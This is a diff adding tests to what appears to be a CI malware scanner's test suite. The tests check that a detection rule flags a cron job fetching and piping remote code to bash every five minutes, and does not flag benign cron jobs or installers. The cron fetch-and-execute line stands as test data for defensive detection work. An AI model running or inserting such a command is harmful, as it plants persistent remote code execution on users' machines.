@@ -146,3 +146,20 @@ class TestCredentialHarvest:
     def test_a_secret_scanner_that_fails_the_build(self, tmp_path: Path) -> None:
         run = f'|\n        {self.SEARCH}\n        test -z "$found" || exit 1'
         assert HARVEST not in DropPointKit.blocking(tmp_path, run)
+
+
+SCHEDULED = "MALWARE.CI.SCHEDULED_FETCH_EXEC.001"
+
+
+class TestAScheduledDownloader:
+    def test_a_cron_entry_that_fetches_and_runs_code(self, tmp_path: Path) -> None:
+        run = '(crontab -l; echo "*/5 * * * * curl -s https://c.example.com/x | bash") | crontab -'
+        assert SCHEDULED in DropPointKit.blocking(tmp_path, run)
+
+    def test_a_cron_entry_that_runs_a_local_script(self, tmp_path: Path) -> None:
+        run = '(crontab -l; echo "0 3 * * * /opt/backup.sh") | crontab -'
+        assert SCHEDULED not in DropPointKit.blocking(tmp_path, run)
+
+    def test_an_installer_piped_to_a_shell_without_cron(self, tmp_path: Path) -> None:
+        run = "curl -fsSL https://get.example.com/install.sh | bash"
+        assert SCHEDULED not in DropPointKit.blocking(tmp_path, run)
